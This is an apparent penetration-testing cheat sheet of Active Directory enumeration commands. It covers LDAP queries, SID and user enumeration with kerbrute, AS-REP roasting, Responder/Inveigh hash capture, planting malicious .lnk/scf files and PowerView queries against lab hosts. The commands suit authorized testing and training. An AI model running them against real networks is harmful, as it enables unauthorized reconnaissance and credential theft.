# Enumeration

### <mark style="color:yellow;">Recon</mark>

```powershell
# LDAP Enumeration
ldapsearch -H ldap://dc.zencorp.htb -x -s base namingcontexts

# LDAP
ldapsearch -H ldap://192.168.110.55 -x -s base -b '' "(objectClass=*)" "*" +
```

```powershell
# LDAP Domain dump
ldapdomaindump -u 'domain.tld\username' -p password -o /tmp dc-ip-address
```

```bash
# Find users by SID's
impacket-lookupsid guest@10.10.11.35 -no-pass 
```

```bash
# Enum4linux
enum4linux -P 172.16.5.5
# Enumerate password policy
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

Use LLMNR/NBT-NS Response Spoofing to capture hashes with Responder or Inveigh. Check for write access on SMB shares. A malicious .lnk or scf file can be used to target the attack host.

```bash
# Responder linux
/sudo responder -I tun0 
# Inveigh in powershell
.\Inveigh.exe
```

### <mark style="color:yellow;">User enumeration</mark>

```bash
# Kerbrute
kerbrute userenum -d ZENCORP.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

# GetNPUsers.py 
GetNPUsers.py 'ZENCORP.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

# Rpcclient
rpcclient -U "" -N 172.16.210.5 rpcclient 
$ enumdomuser

# Crackmapexec
crackmapexec smb 172.16.51.15 --users
crackmapexec smb 172.16.51.51 -u user -p password --users
```

### <mark style="color:yellow;">Windapsearch</mark>

```bash
# Check for bind
python3 windapsearch.py --dc-ip 10.129.1.111 -u "" --functionality

# Get domain users
python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -U

# Get domain computers
python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -C

# Search for OU by user
python3 windapsearch.py --dc-ip 10.129.42.188 -u "" -s "john doe"

# Show groups
python3 windapsearch.py --dc-ip 10.129.42.188 -u "" -G

# Unconstrained delegation
python3 windapsearch.py --dc-ip 10.129.42.188 -u "" -U --unconstrained-users
```

### <mark style="color:yellow;">Ldapsearch-ad.py</mark>

```bash
# Check password policy
python3 ldapsearch-ad.py -l 10.129.1.207 -d zencorp -u john.doe -p pass123 -t pass-pols

# Check for Kerberoastable users
python3 ldapsearch-ad.py -l 10.129.1.207 -d zencorp -u john.doe -p pass123 -t kerberoast | grep servicePrincipalName

# Check ofr ASREPRoastable users
python3 ldapsearch-ad.py -l 10.129.1.207 -d zencorp -u john.doe -p pass123 -t asreproast
```

### <mark style="color:yellow;">Powershell enumeration</mark>

A powerfull script is powerview.ps1 [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

```powershell
# Import powerview.ps1
Import-Module .\PowerView.ps1

# Domain info
Get-ADDomain

# Enumerate password policy
Get-DomainPolicy

# Get users
Get-DomainUser

# Get computers
Get-DomainComputer

# Get group objects
Get-DomainGroup

# Get members of group
Get-ADGroupMember -Identity "GroupName" | Select-Object Name,SamAccountName,objectClass

# Check group is nested into
 Get-ADGroup -Identity "IT" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
```

### <mark style="color:yellow;">PowerView enumeration</mark>

```powershell
# Get basic info
Get-NetUser "username"

# Get group memberships
Get-NetGroup -UserName "username"

# Get Domain admins
Get-NetGroupMember "Domain Admins"

# Detailed user permissions
Get-ObjectAcl -SamAccountName "username" -ResolveGUIDs

# Check for high privileged users
Find-InterestingDomainAcl

# Enumerate user rights
Get-DomainUser -AdminCount
```
